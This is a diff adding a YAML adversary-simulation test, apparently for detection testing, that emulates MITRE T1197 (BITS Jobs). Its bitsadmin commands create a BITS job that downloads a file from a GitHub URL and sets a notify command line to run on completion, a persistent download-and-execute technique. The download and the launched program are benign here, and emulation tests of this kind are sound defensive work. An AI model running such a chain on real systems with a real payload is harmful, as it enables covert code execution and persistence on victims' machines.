@@ -1,0 +1,18 @@
+---
+
+- id: tacmulti-1197-AR02-1v00-200120190847
+  name: Persist, Download, & Execute
+  description: .      This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transfer.      and execute a payload in multiple steps. This job will remain in the BITS queue for 90 days by default if not removed.
+  tactic: multiple
+  technique:
+    attack_id: T1197
+    name: BITS Jobs
+  platforms:
+    windows:
+      cmd:
+        command: |
+          bitsadmin.exe /create AtomicBITS
+          bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\Temp\bitsadmin_flag.ps1
+          bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe C:\Windows\Temp\bitsadmin_flag.ps1
+          bitsadmin.exe /complete AtomicBITS
+          bitsadmin.exe /resume AtomicBITS
